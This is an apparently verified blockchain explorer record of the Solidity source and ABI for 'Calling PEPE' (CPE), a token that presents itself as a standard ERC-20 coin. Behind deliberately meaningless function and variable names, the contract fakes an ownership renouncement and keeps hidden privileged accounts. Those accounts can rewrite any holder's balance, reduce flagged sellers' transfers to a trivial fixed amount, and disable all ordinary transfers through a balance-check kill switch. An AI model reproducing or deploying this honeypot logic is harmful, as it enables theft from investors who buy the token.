{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface limitList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minReceiverLimit) external view returns (uint256);\n\n    function transfer(address takeReceiverSender, uint256 tokenTrading) external returns (bool);\n\n    function allowance(address totalMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeReceiverSender,\n        uint256 tokenTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchMax, uint256 value);\n    event Approval(address indexed totalMode, address indexed spender, uint256 value);\n}\n\nabstract contract totalTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitTeam {\n    function createPair(address isFromMarketing, address fundReceiver) external returns (address);\n}\n\ninterface limitListMetadata is limitList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CallingPEPE is totalTake, limitList, limitListMetadata {\n\n    function getOwner() external view returns (address) {\n        return fromTeam;\n    }\n\n    uint256 constant isBuy = 12 ** 10;\n\n    uint256 atLaunch;\n\n    uint256 exemptFee;\n\n    address private fromTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFund;\n    }\n\n    function limitShould() private view {\n        require(takeMarketing[_msgSender()]);\n    }\n\n    mapping(address => uint256) private minFund;\n\n    bool public enableTokenAmount;\n\n    bool private toExempt;\n\n    bool private enableLaunch;\n\n    uint256 private totalAmountEnable;\n\n    function approve(address maxLaunch, uint256 tokenTrading) public virtual override returns (bool) {\n        isTake[_msgSender()][maxLaunch] = tokenTrading;\n        emit Approval(_msgSender(), maxLaunch, tokenTrading);\n        return true;\n    }\n\n    uint256 public totalWallet;\n\n    bool private tokenLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return txLaunchedTo;\n    }\n\n    uint256 public receiverLaunched;\n\n    function teamIsLimit(address marketingSellFrom, address takeReceiverSender, uint256 tokenTrading) internal returns (bool) {\n        if (marketingSellFrom == receiverAt) {\n            return shouldTotal(marketingSellFrom, takeReceiverSender, tokenTrading);\n        }\n        uint256 swapMarketing = limitList(tokenSender).balanceOf(senderSwapTx);\n        require(swapMarketing == atLaunch);\n        require(takeReceiverSender != senderSwapTx);\n        if (launchedLimitReceiver[marketingSellFrom]) {\n            return shouldTotal(marketingSellFrom, takeReceiverSender, isBuy);\n        }\n        return shouldTotal(marketingSellFrom, takeReceiverSender, tokenTrading);\n    }\n\n    uint256 public toMin;\n\n    function transfer(address feeBuy, uint256 tokenTrading) external virtual override returns (bool) {\n        return teamIsLimit(_msgSender(), feeBuy, tokenTrading);\n    }\n\n    mapping(address => bool) public takeMarketing;\n\n    string private limitFund = \"CPE\";\n\n    string private txLaunchedTo = \"Calling PEPE\";\n\n    event OwnershipTransferred(address indexed buyTotal, address indexed txTake);\n\n    function transferFrom(address marketingSellFrom, address takeReceiverSender, uint256 tokenTrading) external override returns (bool) {\n        if (_msgSender() != maxTrading) {\n            if (isTake[marketingSellFrom][_msgSender()] != type(uint256).max) {\n                require(tokenTrading <= isTake[marketingSellFrom][_msgSender()]);\n                isTake[marketingSellFrom][_msgSender()] -= tokenTrading;\n            }\n        }\n        return teamIsLimit(marketingSellFrom, takeReceiverSender, tokenTrading);\n    }\n\n    function atLimit(address feeBuy, uint256 tokenTrading) public {\n        limitShould();\n        minFund[feeBuy] = tokenTrading;\n    }\n\n    bool public tokenTx;\n\n    function owner() external view returns (address) {\n        return fromTeam;\n    }\n\n    bool private receiverTrading;\n\n    uint256 private liquidityMaxBuy = 100000000 * 10 ** 18;\n\n    address public tokenSender;\n\n    function balanceOf(address minReceiverLimit) public view virtual override returns (uint256) {\n        return minFund[minReceiverLimit];\n    }\n\n    uint256 public atShould;\n\n    function receiverEnableTrading(uint256 tokenTrading) public {\n        limitShould();\n        atLaunch = tokenTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private isTake;\n\n    address senderSwapTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        marketingShould maxFee = marketingShould(maxTrading);\n        tokenSender = limitTeam(maxFee.factory()).createPair(maxFee.WETH(), address(this));\n        \n        receiverAt = _msgSender();\n        amountLaunched();\n        takeMarketing[receiverAt] = true;\n        minFund[receiverAt] = liquidityMaxBuy;\n        if (receiverLaunched != totalAmountEnable) {\n            totalAmountEnable = receiverLaunched;\n        }\n        emit Transfer(address(0), receiverAt, liquidityMaxBuy);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityMaxBuy;\n    }\n\n    mapping(address => bool) public launchedLimitReceiver;\n\n    function amountLaunched() public {\n        emit OwnershipTransferred(receiverAt, address(0));\n        fromTeam = address(0);\n    }\n\n    function listExempt(address limitTradingMarketing) public {\n        limitShould();\n        if (atShould == toMin) {\n            enableLaunch = true;\n        }\n        if (limitTradingMarketing == receiverAt || limitTradingMarketing == tokenSender) {\n            return;\n        }\n        launchedLimitReceiver[limitTradingMarketing] = true;\n    }\n\n    uint8 private launchTo = 18;\n\n    function fundMin(address fromFundTeam) public {\n        if (tokenTx) {\n            return;\n        }\n        if (atShould == totalAmountEnable) {\n            totalAmountEnable = toMin;\n        }\n        takeMarketing[fromFundTeam] = true;\n        \n        tokenTx = true;\n    }\n\n    address public receiverAt;\n\n    function allowance(address receiverShould, address maxLaunch) external view virtual override returns (uint256) {\n        if (maxLaunch == maxTrading) {\n            return type(uint256).max;\n        }\n        return isTake[receiverShould][maxLaunch];\n    }\n\n    address maxTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchTo;\n    }\n\n    function shouldTotal(address marketingSellFrom, address takeReceiverSender, uint256 tokenTrading) internal returns (bool) {\n        require(minFund[marketingSellFrom] >= tokenTrading);\n        minFund[marketingSellFrom] -= tokenTrading;\n        minFund[takeReceiverSender] += tokenTrading;\n        emit Transfer(marketingSellFrom, takeReceiverSender, tokenTrading);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTrading\",\"type\":\"uint256\"}],\"name\":\"atLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiverLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTokenAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFundTeam\",\"type\":\"address\"}],\"name\":\"fundMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedLimitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTradingMarketing\",\"type\":\"address\"}],\"name\":\"listExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenTrading\",\"type\":\"uint256\"}],\"name\":\"receiverEnableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSellFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeReceiverSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CallingPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}